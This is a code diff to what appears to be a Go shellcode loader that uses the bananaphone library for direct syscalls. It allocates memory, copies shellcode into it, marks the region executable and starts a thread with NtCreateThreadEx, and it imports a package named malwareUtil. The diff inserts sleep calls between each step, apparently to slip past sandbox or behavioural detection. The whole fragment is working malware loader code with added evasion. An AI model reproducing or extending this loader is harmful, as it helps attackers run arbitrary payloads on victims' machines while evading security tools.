@@ -88,6 +88,7 @@ func inject(shellcode []byte) {
 }
 
 func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
+	sleep(10)
 	var baseA uintptr
 	regionsize := uintptr(len(shellcode))
 	bananaphone.Syscall(
@@ -101,7 +102,9 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 	)
 	//write memory
 	//bananaphone.WriteMemory(shellcode, baseA)
+	sleep(10)
 	malwareUtil.Memcpy(baseA, shellcode)
+	sleep(10)
 	var oldprotect uintptr
 	bananaphone.Syscall(
 		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
@@ -111,7 +114,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		windows.PAGE_EXECUTE_READ,
 		uintptr(unsafe.Pointer(&oldprotect)),
 	)
-
+	sleep(10)
 	var hhosthread uintptr
 	bananaphone.Syscall(
 		NtCreateThreadExSysid,                //NtCreateThreadEx
@@ -127,5 +130,6 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //sizeofstackreserve
 		0,                                    //lpbytesbuffer
 	)
+	sleep(10)
 	windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
 }
